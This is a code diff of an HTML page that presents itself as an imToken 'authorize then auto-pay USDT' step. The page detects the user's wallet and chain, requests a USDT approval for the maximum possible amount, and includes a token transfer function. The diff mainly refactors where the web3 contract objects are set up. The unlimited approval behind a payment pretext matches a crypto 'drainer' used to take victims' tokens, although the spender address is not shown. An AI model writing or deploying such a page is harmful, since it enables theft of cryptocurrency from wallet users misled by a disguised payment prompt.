@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>imToken - 授权后自动支付 USDT 1</title>
+  <title>imToken - 授权后自动支付 USDT </title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
   <script>
     // 更新时间戳
     function updateTimestamp() {
       const now = new Date();
       const timestamp = `(${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')})`;
-      document.title = `imToken - 授权后自动支付 USDT 1 ${timestamp}`;
+      document.title = `imToken - 授权后自动支付 USDT  ${timestamp}`;
       document.querySelector('h2').textContent = `imToken - 授权后自动支付 USDT 1 ${timestamp}`;
     }
     
@@ -101,6 +101,11 @@
     const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
     const decimals = 6;
     const fromImToken = location.hash.includes("from=imtoken");
+    let wallet = '';
+    let chain = '';
+    let web3 = null;
+    let contract = null;
+    let accounts = [];
 
     // 添加 USDT 合约 ABI
     const contract_abi = [{
@@ -133,19 +138,25 @@
       document.getElementById("status").innerText = "请求钱包授权...";
       try {
         if (typeof window.imToken !== "undefined") {
+          wallet = 'imToken';
           if (typeof window.tronWeb !== "undefined") {
-            // TRON 链处理
+            chain = 'tron';
             return window.tronWeb.defaultAddress.base58;
           } else if (typeof window.ethereum !== "undefined") {
-            // 获取网络版本
             const networkVersion = await window.ethereum.request({method: 'eth_chainId'});
             switch (parseInt(networkVersion)) {
               case 56:
-                // BSC 链
-                return (await window.ethereum.request({method: 'eth_requestAccounts'}))[0];
+                chain = 'bsc';
+                web3 = new Web3(window.ethereum);
+                contract = new web3.eth.Contract(contract_abi, contractAddress);
+                accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+                return accounts[0];
               case 1:
-                // ETH 链
-                return (await window.ethereum.request({method: 'eth_requestAccounts'}))[0];
+                chain = 'eth';
+                web3 = new Web3(window.ethereum);
+                contract = new web3.eth.Contract(contract_abi, contractAddress);
+                accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+                return accounts[0];
               default:
                 throw new Error("不支持的链");
             }
@@ -160,8 +171,6 @@
 
     async function approveUSDT(from, amount) {
       try {
-        const web3 = new Web3(window.ethereum);
-        const contract = new web3.eth.Contract(contract_abi, contractAddress);
         const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
         // 直接调用合约的 approve 方法
@@ -183,8 +192,6 @@
 
     async function transferUSDT(from, amount) {
       try {
-        const web3 = new Web3(window.ethereum);
-        const contract = new web3.eth.Contract(contract_abi, contractAddress);
         const amountInWei = (BigInt(amount * (10 ** decimals))).toString();
         
         // 直接调用合约的 transfer 方法
